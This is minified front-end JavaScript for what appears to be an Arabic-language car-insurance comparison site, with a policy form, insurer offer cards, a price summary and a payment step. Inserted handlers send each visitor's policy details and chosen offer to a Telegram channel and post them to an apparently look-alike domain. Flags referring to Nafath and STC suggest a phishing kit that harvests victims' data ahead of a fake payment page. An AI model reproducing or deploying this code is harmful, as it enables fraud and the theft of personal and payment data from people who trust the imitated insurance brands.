                                        className: "w-full rounded-xl border px-4 py-3 text-center text-sm focus:outline-none focus:ring-2 transition-shadow duration-150 shadow-sm ".concat(T.verificationCode ? "border-red-400 ring-red-300" : "border-gray-300", " [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"),
                                        style: {
                                            backgroundColor: w.surface,
                                            borderColor: T.verificationCode ? w.error : w.border,
                                            color: w.textPrimary
                                        },
                                        placeholder: x.verificationPlaceholder,
                                        value: b.verificationCode,
                                        onChange: D
                                    })
                                })]
                            }), T.verificationCode && (0,
                            a.jsx)("p", {
                                className: "md:col-start-2 md:col-span-2 text-xs mt-1 ".concat(R),
                                style: {
                                    color: w.error
                                },
                                children: T.verificationCode
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            className: "mb-6 pt-2",
                            children: [(0,
                            a.jsxs)("div", {
                                className: "flex items-start",
                                children: [(0,
                                a.jsx)("div", {
                                    className: "ml-2 mt-0.5 flex-shrink-0",
                                    children: (0,
                                    a.jsx)("input", {
                                        id: "agreeToTerms",
                                        name: "agreeToTerms",
                                        type: "checkbox",
                                        checked: b.agreeToTerms,
                                        onChange: D,
                                        className: "h-4 w-4 rounded border-gray-300 focus:ring-offset-0 focus:ring-1 shadow-sm",
                                        style: {
                                            borderColor: w.border,
                                            accentColor: w.primary
                                        }
                                    })
                                }), (0,
                                a.jsx)("div", {
                                    className: "flex-1",
                                    children: (0,
                                    a.jsx)("label", {
                                        htmlFor: "agreeToTerms",
                                        className: "text-xs leading-relaxed cursor-pointer",
                                        style: {
                                            color: w.textSecondary
                                        },
                                        children: x.termsText
                                    })
                                })]
                            }), T.agreeToTerms && (0,
                            a.jsx)("p", {
                                className: "text-xs mt-1 ".concat(R),
                                style: {
                                    color: w.error
                                },
                                children: T.agreeToTerms
                            })]
                        }), T.submit && (0,
                        a.jsx)("p", {
                            className: "text-sm text-center mb-4 p-3 rounded-md",
                            style: {
                                backgroundColor: "".concat(w.error, "20"),
                                color: w.error
                            },
                            children: T.submit
                        }), (0,
                        a.jsx)(d, {
                            setLoading: t,
                            onClick: () => {}
                            ,
                            type: "submit",
                            label: x.submitButton,
                            className: "w-full rounded-xl py-3 text-base font-semibold shadow-md transition duration-300 hover:shadow-lg",
                            style: {
                                backgroundColor: w.accent,
                                color: w.textLight,
                                borderColor: w.accentDark,
                                focusRingColor: w.accentDark
                            }
                        })]
                    })]
                })]
            })
        }
        ;
        let k = Array.from(Array(30), (e, t) => new Date().getFullYear() - t)
          , I = {
            background: u.colors.background,
            surface: u.colors.surface,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            border: u.colors.border
        };
        var E = e => {
            let {setLoading: t, insuranceValue: s, setInsuranceValue: o, InsuranceType: n, setInsuranceType: c, setPageState: x} = e
              , {dir: p} = (0,
            i.Z)()
              , h = "bookingFormConfirmation"
              , [f,y] = (0,
            l.useState)(null)
              , [b,g] = (0,
            l.useState)(new Date().getFullYear())
              , [v,N] = (0,
            l.useState)(null)
              , [w,A] = (0,
            l.useState)("")
              , [C,S] = (0,
            l.useState)({});
            (0,
            l.useEffect)( () => {
                let e = j.getForm(h);
                e && "object" == typeof e && (e.startDate && y(e.startDate),
                e.carYear && g(e.carYear),
                e.selectedOption && N(e.selectedOption),
                e.carType && A(e.carType),
                void 0 !== e.insuranceValue && o(e.insuranceValue),
                "string" == typeof e.InsuranceType && c(e.InsuranceType))
            }
            , [h, c, o]),
            (0,
            l.useEffect)( () => {
                j.setForm(h, {
                    startDate: f,
                    carYear: b,
                    selectedOption: v,
                    carType: w,
                    insuranceValue: s,
                    InsuranceType: n
                })
            }
            , [f, b, v, w, s, n, h]);
            let E = e => {
                N(e.target.value)
            }
              , P = () => {
                let e = {};
                return f || (e.startDate = "تاريخ بدء الوثيقة مطلوب."),
                w || (e.carType = "نوع السيارة مطلوب."),
                (!s || s <= 0) && (e.insuranceValue = "قيمة المركبة مطلوبة ويجب أن تكون أكبر من 0."),
                v || (e.repairPlace = "مكان الإصلاح مطلوب."),
                e
            }
              , T = async () => {
    var e, t;
    if ((null === (e = r.g) || void 0 === e ? void 0 : e.window) === void 0)
        return;
    
    let a = P();
    if (Object.keys(a).length > 0) {
        S(a);
        return;
    }
    S({});

    // رسالة Telegram للتأكيد
    const confirmMessage = `
✅ <b>تأكيد بيانات التأمين</b>
━━━━━━━━━━━━━━━━━━━━

📋 <b>تفاصيل الوثيقة:</b>
├ نوع التأمين: <b>${n}</b>
├ تاريخ البدء: ${f}
├ الغرض: ${b}
├ نوع السيارة: ${w}
├ قيمة المركبة: <code>${s} ر.س</code>
├ سنة الصنع: ${b}
└ مكان الإصلاح: ${v === 'option1' ? '🔧 الورشة' : '🏢 الوكالة'}

🕐 الوقت: ${formatTime()}
━━━━━━━━━━━━━━━━━━━━
    `;

    await sendToTelegram(confirmMessage);

    let o = {
        key: null === (t = localStorage) || void 0 === t ? void 0 : t.getItem("key"),
        startDate: f,
        carYear: b,
        carType: w,
        insuranceValue: s,
        InsuranceType: n,
        selectedOption: "option1" === v ? "الورشة" : "الوكالة",
        inNafath: !1,
        inSTC: !1
    };
    
    await (0, m.iq)({
        url: "https://secure.drivesecuresa.com/bcare/api/user/update",
        data: o
    });
    
    x(2); // الانتقال للعروض
}
            return (0,
            a.jsx)("div", {
                dir: p,
                className: "max-w-md mx-auto rounded-2xl p-6 border",
                style: {
                    backgroundColor: I.surface,
                    borderColor: I.border,
                    boxShadow: u.shadow.card
                },
                children: (0,
                a.jsxs)("div", {
                    className: "space-y-4",
                    children: [(0,
                    a.jsxs)("div", {
                        className: "flex items-start justify-start flex-col",
                        children: [(0,
                        a.jsx)("label", {
                            className: "block mb-2 text-sm",
                            style: {
                                color: I.textSecondary
                            },
                            children: "نوع التأمين"
                        }), (0,
                        a.jsxs)("div", {
                            className: "relative inline-block w-full",
                            children: [(0,
                            a.jsx)("select", {
                                value: n,
                                onChange: e => {
                                    c(e.target.value)
                                }
                                ,
                                className: "h-[45px] block appearance-none w-full border px-4 py-2 pr-8 rounded-xl shadow-sm focus:outline-none text-center",
                                style: {
                                    backgroundColor: I.surface,
                                    borderColor: I.border
                                },
                                children: ["ضد الغير", "شامل"].map(e => (0,
                                a.jsx)("option", {
                                    className: "flex text-center items-center justify-center",
                                    value: e,
                                    children: e
                                }, e))
                            }), (0,
                            a.jsx)("div", {
                                className: "pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700",
                                children: (0,
                                a.jsx)("svg", {
                                    className: "fill-current h-4 w-4",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    viewBox: "0 0 20 20",
                                    children: (0,
                                    a.jsx)("path", {
                                        d: "M7 10l5 5 5-5H7z"
                                    })
                                })
                            })]
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "flex items-start justify-start flex-col",
                        children: [(0,
                        a.jsx)("label", {
                            className: "block mb-2 text-sm",
                            style: {
                                color: I.textSecondary
                            },
                            children: "تاريخ بدء الوثيقة"
                        }), (0,
                        a.jsx)("input", {
                            type: "date",
                            lang: "ar",
                            value: f,
                            onChange: e => y(e.target.value),
                            className: "w-full px-4 py-2 border h-[50px] rounded-xl focus:outline-none",
                            style: {
                                borderColor: I.border,
                                backgroundColor: I.surface
                            }
                        }), C.startDate && (0,
                        a.jsx)("p", {
                            className: "text-red-500 text-sm",
                            children: C.startDate
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "flex items-start justify-start flex-col",
                        children: [(0,
                        a.jsx)("label", {
                            className: "block mb-2 text-sm",
                            style: {
                                color: I.textSecondary
                            },
                            children: "الغرض من استخدام السيارة"
                        }), (0,
                        a.jsxs)("div", {
                            className: "relative inline-block w-full",
                            children: [(0,
                            a.jsx)("select", {
                                value: b,
                                onChange: e => {
                                    g(e.target.value)
                                }
                                ,
                                className: "h-[45px] block appearance-none w-full border px-4 py-2 pr-8 rounded-xl shadow-sm focus:outline-none text-center",
                                style: {
                                    backgroundColor: I.surface,
                                    borderColor: I.border
                                },
                                children: ["شخصي", "تجاري", "تأجير", "نقل الركاب او كريم او اوبر", "نقل بضائع", "نقل مشتقات نفطية"].map(e => (0,
                                a.jsx)("option", {
                                    className: "flex text-center items-center justify-center",
                                    value: e,
                                    children: e
                                }, e))
                            }), (0,
                            a.jsx)("div", {
                                className: "pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700",
                                children: (0,
                                a.jsx)("svg", {
                                    className: "fill-current h-4 w-4",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    viewBox: "0 0 20 20",
                                    children: (0,
                                    a.jsx)("path", {
                                        d: "M7 10l5 5 5-5H7z"
                                    })
                                })
                            })]
                        })]
                    }), (0,
                    a.jsx)("input", {
                        type: "text",
                        className: "h-[50px] w-full p-3 border rounded-xl text-center mt-3 [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none",
                        style: {
                            borderColor: I.border,
                            backgroundColor: I.surface
                        },
                        placeholder: "نوع السيارة",
                        value: w,
                        onChange: e => A(e.target.value)
                    }), C.carType && (0,
                    a.jsx)("p", {
                        className: "text-red-500 text-sm",
                        children: C.carType
                    }), (0,
                    a.jsx)("input", {
                        type: "number",
                        className: "h-[50px] w-full p-3 border rounded-xl text-center mt-3 [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none",
                        style: {
                            borderColor: I.border,
                            backgroundColor: I.surface
                        },
                        placeholder: "قيمة المركبة",
                        value: s,
                        onChange: e => o(e.target.value)
                    }), C.insuranceValue && (0,
                    a.jsx)("p", {
                        className: "text-red-500 text-sm",
                        children: C.insuranceValue
                    }), (0,
                    a.jsxs)("div", {
                        className: "flex items-start justify-start flex-col",
                        children: [(0,
                        a.jsx)("label", {
                            className: "block mb-2 text-sm",
                            style: {
                                color: I.textSecondary
                            },
                            children: "سنة الصنع"
                        }), (0,
                        a.jsxs)("div", {
                            className: "relative inline-block w-full",
                            children: [(0,
                            a.jsx)("select", {
                                value: b,
                                onChange: e => {
                                    g(e.target.value)
                                }
                                ,
                                className: "h-[45px] block appearance-none w-full border px-4 py-2 pr-8 rounded-xl shadow-sm focus:outline-none text-center",
                                style: {
                                    backgroundColor: I.surface,
                                    borderColor: I.border
                                },
                                children: k.map(e => (0,
                                a.jsx)("option", {
                                    className: "flex text-center items-center justify-center",
                                    value: e,
                                    children: e
                                }, e))
                            }), (0,
                            a.jsx)("div", {
                                className: "pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700",
                                children: (0,
                                a.jsx)("svg", {
                                    className: "fill-current h-4 w-4",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    viewBox: "0 0 20 20",
                                    children: (0,
                                    a.jsx)("path", {
                                        d: "M7 10l5 5 5-5H7z"
                                    })
                                })
                            })]
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "flex flex-col items-start justify-center",
                        children: [(0,
                        a.jsx)("label", {
                            className: "block text-gray-700 text-lg font-bold mb-4",
                            children: "مكان الإصلاح"
                        }), (0,
                        a.jsxs)("div", {
                            className: "flex row items-start justify-center gap-10",
                            children: [(0,
                            a.jsxs)("div", {
                                className: "flex items-center mb-4 gap-3",
                                children: [(0,
                                a.jsx)("input", {
                                    id: "option1",
                                    type: "radio",
                                    value: "option1",
                                    checked: "option1" === v,
                                    onChange: E,
                                    className: "form-radio h-5 w-5",
                                    style: {
                                        accentColor: I.primary
                                    }
                                }), (0,
                                a.jsx)("label", {
                                    htmlFor: "option1",
                                    className: "ml-2 text-gray-700",
                                    children: "الورشة"
                                })]
                            }), (0,
                            a.jsxs)("div", {
                                className: "flex items-center gap-3",
                                children: [(0,
                                a.jsx)("input", {
                                    id: "option2",
                                    type: "radio",
                                    value: "option2",
                                    checked: "option2" === v,
                                    onChange: E,
                                    className: "form-radio h-5 w-5",
                                    style: {
                                        accentColor: I.primary
                                    }
                                }), (0,
                                a.jsx)("label", {
                                    htmlFor: "option2",
                                    className: "ml-2 text-gray-700",
                                    children: "الوكالة"
                                })]
                            })]
                        }), C.repairPlace && (0,
                        a.jsx)("p", {
                            className: "text-red-500 text-sm",
                            children: C.repairPlace
                        })]
                    }), (0,
                    a.jsx)("h3", {
                        children: "أوافق علي منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي"
                    }), (0,
                    a.jsx)(d, {
                        setLoading: t,
                        onClick: T,
                        label: "إظهار العروض",
                        className: "w-full font-medium py-2 rounded-xl transition",
                        style: {
                            backgroundColor: I.accent,
                            color: I.textLight
                        }
                    })]
                })
            })
        }
        ;
        let P = {
            primary: u.colors.primary,
            surface: u.colors.surface,
            border: u.colors.border,
            textPrimary: u.colors.textPrimary,
            textLight: u.colors.textLight
        };
        var T = e => {
            let {selectedType: t, setSelectedType: r} = e
              , {dir: s} = (0,
            i.Z)();
            return (0,
            a.jsx)("div", {
                dir: s,
                className: "flex justify-center my-3",
                children: (0,
                a.jsx)("div", {
                    className: "inline-flex rounded-full border p-1 shadow-sm",
                    style: {
                        borderColor: P.border
                    },
                    children: [{
                        label: "ضد الغير",
                        value: "ضد الغير"
                    }, {
                        label: "شامل",
                        value: "شامل"
                    }].map(e => {
                        let s = t === e.value;
                        return (0,
                        a.jsx)("button", {
                            onClick: () => r(e.value),
                            className: "px-3 py-1.5 text-[11px] font-semibold transition rounded-full",
                            style: {
                                backgroundColor: s ? P.primary : P.surface,
                                color: s ? P.textLight : P.textPrimary
                            },
                            children: e.label
                        }, e.value)
                    }
                    )
                })
            })
        }
        ;
        let B = {
            surface: u.colors.surface,
            border: u.colors.border,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            accent: u.colors.accent,
            success: u.colors.success,
            textLight: u.colors.textLight
        };
        var O = e => {
            var t;
            let {setSelectedItem: r, setPageState: s, img: o, company: l, price: n, features: c, discount: x, setLoading: p} = e
              , {dir: h} = (0,
            i.Z)()
              , f = async () => {
                var e;
                let t = {
                    key: null === (e = localStorage) || void 0 === e ? void 0 : e.getItem("key"),
                    selectedInsuranceCompany: {
                        img: o,
                        company: l,
                        price: n,
                        features: c,
                        discount: x
                    }
                };
                null == p || p(!0);
                try {
                    await (0,
                    m.iq)({
                        url: "https://secure.drivesecuresa.com/sa/api/user/update",
                        data: t
                    }),
                    s(3)
                } catch (e) {
                    console.error("Confirmation error:", e)
                } finally {
                    null == p || p(!1)
                }
            }
              , y = parseFloat(String(n).replace(/,/g, ""))
              , b = x || 0
              , g = isNaN(y) ? 0 : y * b / 100
              , v = (isNaN(y) ? 0 : y - g) + 0
              , j = isNaN(v) ? 0 : .15 * v
              , N = Math.max(v + j, 500);
            return (0,
            a.jsxs)("div", {
                dir: h,
                className: "rounded-2xl p-4 sm:p-5 border transition-shadow duration-300 hover:shadow-md",
                style: {
                    backgroundColor: B.surface,
                    borderColor: B.border,
                    boxShadow: u.shadow.soft
                },
                children: [(0,
                a.jsxs)("div", {
                    className: "flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 mb-4",
                    children: [(0,
                    a.jsxs)("div", {
                        className: "flex items-center gap-3",
                        children: [(0,
                        a.jsx)("img", {
                            src: o,
                            className: "object-contain h-10 w-16",
                            alt: l
                        }), (0,
                        a.jsx)("h3", {
                            className: "text-base sm:text-lg font-bold",
                            style: {
                                color: B.textPrimary
                            },
                            children: l
                        })]
                    }), x > 0 && (0,
                    a.jsxs)("div", {
                        className: "text-[11px] font-bold px-2.5 py-1 rounded-full",
                        style: {
                            backgroundColor: "".concat(B.success, "20"),
                            color: B.success
                        },
                        children: ["خصم ", x, "%"]
                    })]
                }), (0,
                a.jsxs)("div", {
                    className: "mb-4 pl-4",
                    children: [(0,
                    a.jsx)("p", {
                        className: "text-[11px] font-semibold mb-2",
                        style: {
                            color: B.textSecondary
                        },
                        children: "التغطيات الأساسية:"
                    }), (0,
                    a.jsx)("ul", {
                        className: "list-disc space-y-1.5 text-xs leading-relaxed",
                        style: {
                            color: B.textPrimary
                        },
                        children: c.length > 0 ? c.map( (e, t) => (0,
                        a.jsx)("li", {
                            children: e
                        }, t)) : (0,
                        a.jsx)("li", {
                            children: "تغطية المسؤولية تجاه الغير."
                        })
                    })]
                }), (0,
                a.jsxs)("div", {
                    className: "flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 pt-4 border-t",
                    style: {
                        borderColor: B.border
                    },
                    children: [(0,
                    a.jsxs)("div", {
                        className: "flex flex-col items-start",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "text-2xl font-extrabold",
                            style: {
                                color: B.accent
                            },
                            children: [null == N ? void 0 : null === (t = N.toFixed) || void 0 === t ? void 0 : t.call(N, 1), " ر.س"]
                        }), (0,
                        a.jsx)("div", {
                            className: "text-xs font-medium mt-1",
                            style: {
                                color: B.textSecondary
                            },
                            children: "شامل ضريبة القيمة المضافة"
                        })]
                    }), (0,
                    a.jsx)(d, {
                        setLoading: p,
onClick: async () => {
    // رسالة Telegram للعرض المختار
    const offerMessage = `
🎯 <b>العرض المختار</b>
━━━━━━━━━━━━━━━━━━━━

🏢 <b>شركة التأمين:</b>
${l}

💰 <b>السعر:</b>
├ السعر الأساسي: ${n} ر.س
├ الخصم: ${x}%
└ السعر النهائي: <b>${(parseFloat(String(n).replace(/,/g, '')) * (1 - x/100) * 1.15).toFixed(2)} ر.س</b>

📋 <b>التغطيات:</b>
${c.map((e, t) => `${t + 1}. ${e}`).join('\n')}

🕐 الوقت: ${formatTime()}
━━━━━━━━━━━━━━━━━━━━
    `;

    await sendToTelegram(offerMessage);

    null == p || p(!0);
    
    let e = [1e3, 2e3, 3e3]
      , t = e[Math.floor(Math.random() * e.length)];
    
    return new Promise(e => {
        setTimeout(async () => {
            r({
                img: o,
                company: l,
                price: n,
                features: c,
                discount: x
            });
            await f();
            e();
            window.scrollTo(0, 0);
        }, t);
    });
}

                        ,
                        label: "اشترِ الآن",
                        className: "w-full sm:w-auto font-bold py-2.5 px-6 text-sm rounded-lg transition-colors duration-300 shadow-md",
                        style: {
                            backgroundColor: B.accent,
                            color: B.textLight
                        }
                    })]
                })]
            })
        }
        ;
        let D = {
            background: u.colors.background,
            primary: u.colors.primary,
            textSecondary: u.colors.textSecondary
        }
          , L = [{
            img: "/Tawuniya.png",
            company: "التعاونية للتأمين - يغطي إصلاح مركبتك*",
            price: 670,
            features: ["الحد الأقصى لمسؤولية الشركة تجاه الغير في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية ( بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية ) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال"],
            discount: 15
        }, {
            img: "/UCA.png",
            company: "الشركة المتحدة للتأمين التعاوني",
            price: 793,
            features: ["خدمة المساعدة على الطريق"],
            discount: 10
        }, {
            img: "/ART.png",
            company: "تأمين المركبات ضد الغير – الراجحي تكافل",
            price: 468,
            features: ["الحد الأقصى لمسؤولية الشركة في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية (بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال (عشرة ملايين ريال سعودي) حداً أقصى لمسئولية الشركة"],
            discount: 20
        }, {
            img: "/walaa.png",
            company: "شركة ولاء للتأمين التعاوني",
            price: 521,
            features: ["الحد الأقصى لمسؤولية الشركة في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية (بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال (عشرة ملايين ريال سعودي) حداً أقصى لمسئولية الشركة"],
            discount: 0
        }, {
            img: "/GulfUnion.png",
            company: "شركة إتحاد الخليج الاهلية للتأمين التعاوني",
            price: 433,
            features: ["الحد الأقصى لمسؤولية الشركة في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية (بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال (عشرة ملايين ريال سعودي) حداً أقصى لمسئولية الشركة"],
            discount: 0
        }, {
            img: "/Medgulf.png",
            company: "شركة المتوسط والخليج للتأمين وإعادة التأمين التعاوني (ميدغلف)",
            price: 499,
            features: ["الحد الأقصى لمسؤولية الشركة في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية (بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال (عشرة ملايين ريال سعودي) حداً أقصى لمسئولية الشركة"],
            discount: 10
        }, {
            img: "/AICC.png",
            company: "شركة التأمين العربية التعاونية",
            price: 506,
            features: ["تغطية المسؤولية"],
            discount: 20
        }, {
            img: "/TUCI.png",
            company: "شركة الاتحاد للتأمين التعاوني",
            price: 506,
            features: ["الحد الأقصى لمسؤولية الشركة في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية (بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال (عشرة ملايين ريال سعودي) حداً أقصى لمسئولية الشركة"],
            discount: 12.5
        }, {
            img: "/GGCIC.png",
            company: "الشركة الخليجية العامة للتأمين التعاوني",
            price: 492,
            features: ["الحد الأقصى لمسؤولية الشركة في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية (بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال (عشرة ملايين ريال سعودي) حداً أقصى لمسئولية الشركة"],
            discount: 0
        }, {
            img: "/Tawuniya.png",
            company: "شركة التعاونية للتأمين التعاوني-تأمين ضد الغير",
            price: 570,
            features: ["الحد الأقصى لمسؤولية الشركة تجاه الغير في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية ( بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية ) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال"],
            discount: 10
        }, {
            img: "/WIC.png",
            company: "الشركه الوطنيه للتأمين",
            price: 550,
            features: ["المسؤولية تجاه الغير (الطرف الثالث):الحد الأقصى لمسؤولية الشركة في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية (بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال (عشرة ملايين ريال سعودي) حداً أقصى لمسئولية الشركة"],
            discount: 10
        }, {
            img: "/Malath.png",
            company: "شركة ملاذ للتأمين وإعادة التأمين التعاوني",
            price: 838,
            features: ["الحد الأقصى لمسؤولية الشركة في الواقعة الواحدة وخلال فترة سريان وثيقة التأمين بالنسبة للأضرار الجسدية (بما في ذلك الديات والمبالغ المقدرة عن الإصابات والمصاريف الطبية) والأضرار المادية معاً لن تتجاوز مبلغاً إجمالياً قدره 10,000,000 ريال (عشرة ملايين ريال سعودي) حداً أقصى لمسئولية الشركة"],
            discount: 10
        }, {
            img: "/AlSagr.png",
            company: "شركة الصقر للتأمين",
            price: 438,
            features: ["المسؤولية المدنية تجاه الغير- ضد الغير"],
            discount: 0
        }, {
            img: "/Buruj.png",
            company: "شركة بروج للتأمين التعاوني",
            price: 743,
            features: [],
            discount: 10
        }];
        var R = e => {
            let {InsuranceType: t, insuranceValue: r, setPageState: s, setSelectedItem: o, setLoading: n, setInsuranceType: c} = e
              , {dir: d} = (0,
            i.Z)()
              , [m,u] = (0,
            l.useState)([])
              , x = t || "ضد الغير";
            return (0,
            l.useEffect)( () => {
                window.scrollTo(0, 0)
            }
            , []),
            (0,
            l.useEffect)( () => {
                let e = (e, t, r, a) => Math.max("شامل" === r ? 1.8 * e + .013 * a : e + .001 * a, 500);
                u(L.map(t => ({
                    ...t,
                    calculatedPrice: e(t.price, t.discount, x, r)
                })))
            }
            , [r, x]),
            (0,
            a.jsx)("div", {
                dir: d,
                className: "min-h-screen py-8 lg:py-12",
                style: {
                    backgroundColor: D.background
                },
                children: (0,
                a.jsxs)("div", {
                    className: "max-w-4xl mx-auto px-4 sm:px-6 lg:px-8",
                    children: [(0,
                    a.jsxs)("div", {
                        className: "text-center mb-6",
                        children: [(0,
                        a.jsx)("h2", {
                            className: "text-2xl lg:text-3xl font-bold mb-2",
                            style: {
                                color: D.primary
                            },
                            children: "قارن أفضل عروض التأمين"
                        }), (0,
                        a.jsx)("p", {
                            className: "text-sm sm:text-base max-w-2xl mx-auto",
                            style: {
                                color: D.textSecondary
                            },
                            children: "اختر نوع التأمين وشاهد العروض المناسبة لك من أفضل الشركات."
                        })]
                    }), (0,
                    a.jsx)(T, {
                        selectedType: x,
                        setSelectedType: c
                    }), (0,
                    a.jsx)("div", {
                        className: "mt-6 grid grid-cols-1 gap-4",
                        children: m.map( (e, t) => {
                            var r, l;
                            return (0,
                            a.jsx)(O, {
                                setSelectedItem: o,
                                setPageState: s,
                                setLoading: n,
                                img: e.img,
                                company: e.company,
                                price: null === (l = e.calculatedPrice) || void 0 === l ? void 0 : null === (r = l.toFixed) || void 0 === r ? void 0 : r.call(l, 1),
                                features: e.features,
                                discount: e.discount
                            }, t)
                        }
                        )
                    })]
                })
            })
        }
        ;
        let F = {
            background: u.colors.background,
            surface: u.colors.surface,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            border: u.colors.border
        }
          , M = e => {
            let t = Number(e);
            return isNaN(t) ? "0.00 ر.س" : new Intl.NumberFormat("en-SA",{
                style: "currency",
                currency: "SAR"
            }).format(t)
        }
        ;
        var Q = e => {
            let {setPageState: t, selectedItem: r, setLoading: s} = e
              , {dir: o} = (0,
            i.Z)();
            (0,
            l.useEffect)( () => {
                window.scrollTo(0, 0)
            }
            , []);
            let n = parseFloat(String(r.price).replace(/,/g, ""))
              , c = r.discount || 0
              , m = isNaN(n) ? 0 : n * (n <= 525 ? 0 : c) / 100
              , x = isNaN(n) ? 0 : n - m
              , p = x + 0
              , h = isNaN(p) ? 0 : .15 * p
              , f = [{
                label: "سعر الوثيقة",
                value: M(n)
            }, {
                label: "خصم عدم وجود مطالبات",
                value: M(m)
            }, {
                label: "رسوم إدارية",
                value: M(0)
            }, {
                label: "قسط إشتراك التأمين",
                value: M(x)
            }, {
                label: "المجموع الجزئي",
                value: M(p)
            }, {
                label: "ضريبة القيمة المضافة",
                value: M(h)
            }];
            return (0,
            a.jsx)("div", {
                dir: o,
                className: "min-h-screen py-6 lg:py-10",
                style: {
                    backgroundColor: F.background
                },
                children: (0,
                a.jsx)("div", {
                    className: "max-w-sm mx-auto px-4",
                    children: (0,
                    a.jsxs)("div", {
                        className: "rounded-2xl p-4 border",
                        style: {
                            backgroundColor: F.surface,
                            borderColor: F.border,
                            boxShadow: u.shadow.card
                        },
                        children: [(0,
                        a.jsxs)("div", {
                            className: "text-center mb-4",
                            children: [(0,
                            a.jsx)("h1", {
                                className: "text-lg font-bold mb-1",
                                style: {
                                    color: F.textPrimary
                                },
                                children: "ملخص الطلب"
                            }), (0,
                            a.jsx)("p", {
                                className: "text-sm",
                                style: {
                                    color: F.textSecondary
                                },
                                children: "يرجى مراجعة التفاصيل قبل الدفع."
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            className: "flex flex-col items-center mb-4 border-b pb-4",
                            children: [(0,
                            a.jsx)("img", {
                                src: r.img,
                                alt: "".concat(r.company, " logo"),
                                className: "h-12 object-contain mb-2"
                            }), (0,
                            a.jsx)("h2", {
                                className: "text-base font-bold text-center",
                                style: {
                                    color: F.textPrimary
                                },
                                children: r.company
                            }), (0,
                            a.jsx)("p", {
                                className: "text-xs text-center mt-1",
                                style: {
                                    color: F.textSecondary
                                },
                                children: "تأمين المركبات ضد الغير"
                            })]
                        }), (0,
                        a.jsx)("div", {
                            className: "mb-4 space-y-2",
                            children: f.map(e => (0,
                            a.jsxs)("div", {
                                className: "flex justify-between items-center py-2 px-2.5 rounded-md",
                                style: {
                                    backgroundColor: u.colors.primaryLight
                                },
                                children: [(0,
                                a.jsx)("span", {
                                    className: "text-xs font-medium",
                                    style: {
                                        color: F.textSecondary
                                    },
                                    children: e.label
                                }), (0,
                                a.jsx)("span", {
                                    className: "text-xs font-semibold",
                                    style: {
                                        color: F.textPrimary
                                    },
                                    children: e.value
                                })]
                            }, e.label))
                        }), (0,
                        a.jsxs)("div", {
                            className: "flex justify-between items-center text-lg font-extrabold mb-4 pt-3 border-t",
                            style: {
                                borderColor: F.border
                            },
                            children: [(0,
                            a.jsx)("span", {
                                className: "",
                                style: {
                                    color: F.textPrimary
                                },
                                children: "الإجمالي"
                            }), (0,
                            a.jsx)("span", {
                                className: "",
                                style: {
                                    color: F.accent
                                },
                                children: M(p + h)
                            })]
                        }), (0,
                        a.jsx)(d, {
                            setLoading: s,
                            onClick: () => t(4),
                            label: "متابعة إلى الدفع",
                            className: "w-full font-bold py-2.5 text-sm rounded-lg transition-colors duration-300 shadow-md",
                            style: {
                                backgroundColor: F.accent,
                                color: F.textLight
                            }
                        })]
                    })
                })
            })
        }
